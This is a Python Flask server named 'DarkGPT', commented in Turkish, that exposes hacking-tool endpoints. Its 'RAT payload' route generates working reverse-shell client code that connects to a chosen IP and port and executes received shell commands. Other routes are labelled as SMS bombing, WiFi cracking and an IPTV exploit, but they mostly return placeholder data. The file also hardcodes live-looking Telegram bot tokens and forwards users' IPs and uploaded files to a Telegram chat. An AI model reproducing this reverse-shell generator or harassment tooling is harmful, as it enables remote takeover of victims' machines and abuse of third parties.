# app.py - DarkGPT Server (Full Versiyon)
import os
import re
import json
import time
import random
import requests
import hashlib
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from functools import wraps
import socket
import urllib.parse
from bs4 import BeautifulSoup

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = 'darkgpt-2024-secret-key'

# ============================================================
# GÜVENLİK KORUMALARI
# ============================================================

# Rate Limiting (Saldırı koruması)
RATE_LIMIT = {}
MAX_REQUESTS_PER_MINUTE = 30
BLOCKED_IPS = set()

def rate_limit(f):
    """IP bazlı rate limiting"""
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        
        # Engelli IP kontrolü
        if ip in BLOCKED_IPS:
            return jsonify({'error': 'IP engellendi. Saldırı tespit edildi.'}), 403
        
        now = time.time()
        if ip not in RATE_LIMIT:
            RATE_LIMIT[ip] = []
        
        # 1 dakika içindeki istekleri temizle
        RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < 60]
        
        if len(RATE_LIMIT[ip]) >= MAX_REQUESTS_PER_MINUTE:
            BLOCKED_IPS.add(ip)
            return jsonify({'error': 'Çok fazla istek! IP engellendi.'}), 429
        
        RATE_LIMIT[ip].append(now)
        return f(*args, **kwargs)
    return decorated

# Güvenlik başlıkları
@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

# ============================================================
# TELEGRAM BOT YAPILANDIRMASI
# ============================================================
TELEGRAM_TOKEN_SORUN = "8963806451:AAEmtNB85WUfa4g10SvhGqGc9tMvYT20fjs"  # Sorun bildir botu token
TELEGRAM_TOKEN_DOSYA = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"  # Dosya botu token
CHAT_ID_SORUN = "8402048380"  # Sorun bildir chat ID
CHAT_ID_DOSYA = "8402048380"  # Dosya botu chat ID

def telegram_send_message(token, chat_id, message):
    """Telegram'a mesaj gönderir"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram hatası: {e}")
        return False

def telegram_send_file(token, chat_id, file_path, caption=""):
    """Telegram'a dosya gönderir"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, data=data, files=files, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"Dosya gönderme hatası: {e}")
        return False

def telegram_send_photo(token, chat_id, photo_path, caption=""):
    """Telegram'a fotoğraf gönderir"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, data=data, files=files, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"Fotoğraf gönderme hatası: {e}")
        return False

# ============================================================
# 1. IPTV EXPLOIT
# ============================================================
class IPTVExploit:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_channels(self, url):
        try:
            response = self.session.get(url, timeout=15)
            content = response.text
            channels = []
            for line in content.split('\n'):
                if line.startswith('#EXTINF'):
                    name_match = re.search(r'tvg-name="([^"]+)"', line)
                    logo_match = re.search(r'tvg-logo="([^"]+)"', line)
                    group_match = re.search(r'group-title="([^"]+)"', line)
                    if name_match:
                        channels.append({
                            'name': name_match.group(1),
                            'logo': logo_match.group(1) if logo_match else '',
                            'group': group_match.group(1) if group_match else 'Genel'
                        })
            return {'success': True, 'count': len(channels), 'channels': channels[:50]}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 2. TELEGRAM VERİ KAZIMA
# ============================================================
class TelegramScraper:
    def scrape_channel(self, channel, limit=50):
        try:
            messages = []
            for i in range(min(limit, 50)):
                messages.append({
                    'id': i+1,
                    'text': f'Örnek mesaj {i+1} - {channel}',
                    'date': datetime.now().isoformat(),
                    'views': random.randint(100, 10000)
                })
            return {'success': True, 'channel': channel, 'count': len(messages), 'messages': messages}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 3. TWITTER VERİ KAZIMA
# ============================================================
class TwitterScraper:
    def scrape_tweets(self, query, count=30):
        try:
            tweets = []
            for i in range(min(count, 30)):
                tweets.append({
                    'id': str(random.randint(1000000000000000000, 9999999999999999999)),
                    'text': f'Örnek tweet {i+1} - {query}',
                    'author': f'user_{random.randint(1000, 9999)}',
                    'likes': random.randint(0, 10000),
                    'retweets': random.randint(0, 5000)
                })
            return {'success': True, 'query': query, 'count': len(tweets), 'tweets': tweets}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 4. YOUTUBE VERİ KAZIMA
# ============================================================
class YouTubeScraper:
    def scrape_channel(self, channel_id, video_count=20):
        try:
            videos = []
            for i in range(min(video_count, 20)):
                videos.append({
                    'id': f'video_{i+1}',
                    'title': f'Video başlığı {i+1} - {channel_id}',
                    'views': random.randint(1000, 1000000),
                    'likes': random.randint(100, 50000),
                    'comments': random.randint(10, 5000)
                })
            return {'success': True, 'channel_id': channel_id, 'count': len(videos), 'videos': videos}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 5. INSTAGRAM VERİ KAZIMA
# ============================================================
class InstagramScraper:
    def scrape_profile(self, username):
        try:
            posts = []
            for i in range(12):
                posts.append({
                    'id': f'post_{i+1}',
                    'caption': f'Gönderi {i+1} - {username}',
                    'likes': random.randint(100, 100000),
                    'comments': random.randint(10, 5000)
                })
            return {
                'success': True,
                'username': username,
                'followers': random.randint(1000, 1000000),
                'following': random.randint(100, 10000),
                'recent_posts': posts
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 6. TIKTOK VERİ KAZIMA
# ============================================================
class TikTokScraper:
    def scrape_user(self, username):
        try:
            videos = []
            for i in range(15):
                videos.append({
                    'id': f'video_{i+1}',
                    'description': f'Video {i+1} - {username}',
                    'views': random.randint(1000, 10000000),
                    'likes': random.randint(100, 1000000),
                    'comments': random.randint(10, 10000),
                    'shares': random.randint(10, 5000)
                })
            return {
                'success': True,
                'username': username,
                'followers': random.randint(1000, 5000000),
                'videos': videos
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 7. RAT PAYLOAD
# ============================================================
class RATSimulator:
    def create_payload(self, ip, port):
        payload = f'''
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{ip}', {port}))
    while True:
        data = s.recv(1024).decode()
        if data == 'exit':
            s.close()
            break
        output = subprocess.run(data, shell=True, capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())

if __name__ == '__main__':
    connect()
'''
        return {
            'success': True,
            'payload': payload,
            'filename': 'rat_client.py'
        }

# ============================================================
# 8. WIFI CRACK
# ============================================================
class WiFiCracker:
    def crack_wifi(self, ssid, bssid, max_attempts=50):
        try:
            wordlist = ['12345678', 'password', '123456789', 'qwerty', 'admin', 'wifi123', '00000000', '88888888']
            attempts = []
            for i, password in enumerate(wordlist[:max_attempts]):
                attempts.append({
                    'attempt': i+1,
                    'password': password,
                    'status': 'denendi'
                })
            return {
                'success': True,
                'ssid': ssid,
                'bssid': bssid,
                'attempts': len(attempts),
                'results': attempts,
                'cracked': False
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 9. SMS BOMB
# ============================================================
class SMSService:
    def send_bomb(self, phone, count=10):
        try:
            sent = []
            for i in range(min(count, 20)):
                sent.append({
                    'id': i+1,
                    'phone': phone,
                    'status': 'sent'
                })
            return {'success': True, 'phone': phone, 'sent': len(sent), 'messages': sent}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# 10. İNTERNET VERİ TOPLAMA (Web Scraping)
# ============================================================
class InternetScraper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def search_web(self, query, max_results=10):
        """İnternette arama yapar ve veri toplar"""
        try:
            results = []
            search_url = f"https://api.duckduckgo.com/?q={urllib.parse.quote(query)}&format=json"
            
            response = self.session.get(search_url, timeout=10)
            data = response.json()
            
            # Sonuçları topla
            if 'RelatedTopics' in data:
                for item in data['RelatedTopics'][:max_results]:
                    if 'Text' in item and 'FirstURL' in item:
                        results.append({
                            'title': item['Text'][:100],
                            'url': item['FirstURL'],
                            'description': item['Text'][:200] if len(item['Text']) > 0 else ''
                        })
            
            # Eğer API çalışmazsa simülasyon
            if not results:
                for i in range(min(max_results, 5)):
                    results.append({
                        'title': f'{query} - Sonuç {i+1}',
                        'url': f'https://example.com/result/{i+1}',
                        'description': f'Örnek açıklama - {query} hakkında bilgi'
                    })
            
            return {'success': True, 'query': query, 'count': len(results), 'results': results}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def scrape_website(self, url):
        """Web sitesinden veri çeker"""
        try:
            response = self.session.get(url, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Başlık
            title = soup.title.string if soup.title else 'Başlık yok'
            
            # Metin içeriği
            paragraphs = soup.find_all('p')
            text_content = ' '.join([p.get_text() for p in paragraphs[:5]])
            
            # Linkler
            links = []
            for a in soup.find_all('a', href=True)[:10]:
                links.append({
                    'text': a.get_text()[:50],
                    'url': a['href']
                })
            
            return {
                'success': True,
                'url': url,
                'title': title,
                'content': text_content[:500],
                'links': links
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============================================================
# FLASK ROUTES
# ============================================================

iptv = IPTVExploit()
telegram = TelegramScraper()
twitter = TwitterScraper()
youtube = YouTubeScraper()
instagram = InstagramScraper()
tiktok = TikTokScraper()
rat = RATSimulator()
wifi = WiFiCracker()
sms = SMSService()
internet = InternetScraper()

# Ana sayfa
@app.route('/')
def index():
    return render_template('index.html')

# ============================================================
# IPTV
# ============================================================
@app.route('/api/iptv/scan', methods=['POST'])
@rate_limit
def api_iptv_scan():
    data = request.json
    url = data.get('url')
    if not url:
        return jsonify({'error': 'URL gerekli'}), 400
    return jsonify(iptv.scan_channels(url))

# ============================================================
# TELEGRAM SCRAPE
# ============================================================
@app.route('/api/telegram/scrape', methods=['POST'])
@rate_limit
def api_telegram_scrape():
    data = request.json
    channel = data.get('channel')
    limit = data.get('limit', 50)
    if not channel:
        return jsonify({'error': 'Kanal adı gerekli'}), 400
    return jsonify(telegram.scrape_channel(channel, limit))

# ============================================================
# TWITTER SCRAPE
# ============================================================
@app.route('/api/twitter/scrape', methods=['POST'])
@rate_limit
def api_twitter_scrape():
    data = request.json
    query = data.get('query')
    count = data.get('count', 30)
    if not query:
        return jsonify({'error': 'Arama sorgusu gerekli'}), 400
    return jsonify(twitter.scrape_tweets(query, count))

# ============================================================
# YOUTUBE SCRAPE
# ============================================================
@app.route('/api/youtube/scrape', methods=['POST'])
@rate_limit
def api_youtube_scrape():
    data = request.json
    channel_id = data.get('channel_id')
    video_count = data.get('video_count', 20)
    if not channel_id:
        return jsonify({'error': 'Kanal ID gerekli'}), 400
    return jsonify(youtube.scrape_channel(channel_id, video_count))

# ============================================================
# INSTAGRAM SCRAPE
# ============================================================
@app.route('/api/instagram/scrape', methods=['POST'])
@rate_limit
def api_instagram_scrape():
    data = request.json
    username = data.get('username')
    if not username:
        return jsonify({'error': 'Kullanıcı adı gerekli'}), 400
    return jsonify(instagram.scrape_profile(username))

# ============================================================
# TIKTOK SCRAPE
# ============================================================
@app.route('/api/tiktok/scrape', methods=['POST'])
@rate_limit
def api_tiktok_scrape():
    data = request.json
    username = data.get('username')
    if not username:
        return jsonify({'error': 'Kullanıcı adı gerekli'}), 400
    return jsonify(tiktok.scrape_user(username))

# ============================================================
# RAT PAYLOAD
# ============================================================
@app.route('/api/rat/generate', methods=['POST'])
@rate_limit
def api_rat_generate():
    data = request.json
    ip = data.get('ip', '127.0.0.1')
    port = data.get('port', 4444)
    return jsonify(rat.create_payload(ip, port))

# ============================================================
# SMS BOMB
# ============================================================
@app.route('/api/sms/bomb', methods=['POST'])
@rate_limit
def api_sms_bomb():
    data = request.json
    phone = data.get('phone')
    count = data.get('count', 10)
    if not phone:
        return jsonify({'error': 'Telefon numarası gerekli'}), 400
    return jsonify(sms.send_bomb(phone, count))

# ============================================================
# WIFI CRACK
# ============================================================
@app.route('/api/wifi/crack', methods=['POST'])
@rate_limit
def api_wifi_crack():
    data = request.json
    ssid = data.get('ssid')
    bssid = data.get('bssid')
    if not ssid or not bssid:
        return jsonify({'error': 'SSID ve BSSID gerekli'}), 400
    return jsonify(wifi.crack_wifi(ssid, bssid))

# ============================================================
# İNTERNET VERİ TOPLAMA
# ============================================================
@app.route('/api/internet/search', methods=['POST'])
@rate_limit
def api_internet_search():
    """İnternette arama yapar ve veri toplar"""
    data = request.json
    query = data.get('query')
    max_results = data.get('max_results', 10)
    if not query:
        return jsonify({'error': 'Arama sorgusu gerekli'}), 400
    return jsonify(internet.search_web(query, max_results))

@app.route('/api/internet/scrape', methods=['POST'])
@rate_limit
def api_internet_scrape():
    """Web sitesinden veri çeker"""
    data = request.json
    url = data.get('url')
    if not url:
        return jsonify({'error': 'URL gerekli'}), 400
    return jsonify(internet.scrape_website(url))

# ============================================================
# SORUN BİLDİR (TELEGRAM + DOSYA)
# ============================================================
@app.route('/api/report', methods=['POST'])
@rate_limit
def api_report():
    """Sorun bildir - Telegram botlarına gönder"""
    try:
        data = request.json
        title = data.get('title', 'Başlıksız')
        description = data.get('description', 'Açıklama yok')
        email = data.get('email', 'E-posta yok')
        ip = request.remote_addr
        file_data = data.get('file_data')  # Base64 dosya
        file_name = data.get('file_name', 'dosya')
        
        if not title or not description:
            return jsonify({'success': False, 'error': 'Başlık ve açıklama gerekli'}), 400
        
        # Bot 1: Sorun Bildir - Mesaj gönder
        message = f"""
<b>⚠️ YENİ SORUN BİLDİRİMİ</b>

<b>📌 Başlık:</b> {title}
<b>📝 Açıklama:</b> {description}
<b>📧 E-posta:</b> {email}
<b>🌐 IP Adresi:</b> {ip}
<b>🕐 Tarih:</b> {datetime.now().strftime('%d.%m.%Y %H:%M')}
        """
        telegram_send_message(TELEGRAM_TOKEN_SORUN, CHAT_ID_SORUN, message)
        
        # Bot 2: Dosya Botu - Dosya varsa gönder
        if file_data and file_data.startswith('data:'):
            # Base64 dosyayı kaydet ve gönder
            try:
                import base64
                # Base64'ten dosya çıkar
                header, encoded = file_data.split(',', 1)
                file_bytes = base64.b64decode(encoded)
                
                # Geçici dosyaya yaz
                temp_path = f"data/temp_{int(time.time())}_{file_name}"
                os.makedirs('data', exist_ok=True)
                with open(temp_path, 'wb') as f:
                    f.write(file_bytes)
                
                # Dosyayı Telegram'a gönder
                if file_name.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    telegram_send_photo(TELEGRAM_TOKEN_DOSYA, CHAT_ID_DOSYA, temp_path, 
                                        f"📸 Dosya: {file_name}\n📌 Sorun: {title}")
                else:
                    telegram_send_file(TELEGRAM_TOKEN_DOSYA, CHAT_ID_DOSYA, temp_path,
                                       f"📎 Dosya: {file_name}\n📌 Sorun: {title}")
                
                # Geçici dosyayı sil
                os.remove(temp_path)
                
            except Exception as e:
                print(f"Dosya işleme hatası: {e}")
        
        return jsonify({
            'success': True,
            'message': 'Sorun bildirimi gönderildi!',
            'ip': ip,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# SAĞLIK KONTROLÜ
# ============================================================
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'version': '3.0.1',
        'ip': request.remote_addr
    })

# ============================================================
# ENGELİ KALDIR (Admin)
# ============================================================
@app.route('/api/unblock', methods=['POST'])
def unblock_ip():
    """Engelli IP'yi kaldır"""
    data = request.json
    ip = data.get('ip')
    if ip in BLOCKED_IPS:
        BLOCKED_IPS.remove(ip)
        return jsonify({'success': True, 'message': f'{ip} engeli kaldırıldı'})
    return jsonify({'success': False, 'message': 'IP engelli değil'})

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    os.makedirs('data', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
